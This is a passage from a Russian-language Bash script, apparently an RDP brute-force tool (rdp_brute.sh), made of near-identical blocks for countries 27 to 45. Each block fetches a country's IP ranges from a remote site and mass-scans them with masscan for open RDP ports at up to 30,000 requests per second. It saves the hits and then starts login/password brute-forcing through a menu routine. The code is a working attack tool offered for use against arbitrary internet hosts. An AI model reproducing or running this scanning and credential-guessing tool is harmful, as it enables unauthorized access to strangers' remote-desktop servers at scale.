echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "27" ]; then
curl http://ipdiapazon.16mb.com/Botswana.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "28" ]; then
curl http://ipdiapazon.16mb.com/Brazil.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "29" ]; then
curl http://ipdiapazon.16mb.com/British_indian_ocean_territory.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "30" ]; then
curl http://ipdiapazon.16mb.com/Brunei_darussalam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "31" ]; then
curl http://ipdiapazon.16mb.com/Bulgaria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "32" ]; then
curl http://ipdiapazon.16mb.com/Burkina_faso.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "33" ]; then
curl http://ipdiapazon.16mb.com/Burundi.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "34" ]; then
curl http://ipdiapazon.16mb.com/Cambodia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "35" ]; then
curl http://ipdiapazon.16mb.com/Cameroon.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "36" ]; then
curl http://ipdiapazon.16mb.com/Canada.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "37" ]; then
curl http://ipdiapazon.16mb.com/Cayman_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "38" ]; then
curl http://ipdiapazon.16mb.com/Central_african_republic.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "39" ]; then
curl http://ipdiapazon.16mb.com/Chile.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "40" ]; then
curl http://ipdiapazon.16mb.com/China.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "41" ]; then
curl http://ipdiapazon.16mb.com/Colombia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "42" ]; then
curl http://ipdiapazon.16mb.com/Congo.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "43" ]; then
curl http://ipdiapazon.16mb.com/Cook_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "44" ]; then
curl http://ipdiapazon.16mb.com/Costa_rica.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "45" ]; then
curl http://ipdiapazon.16mb.com/Cote.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
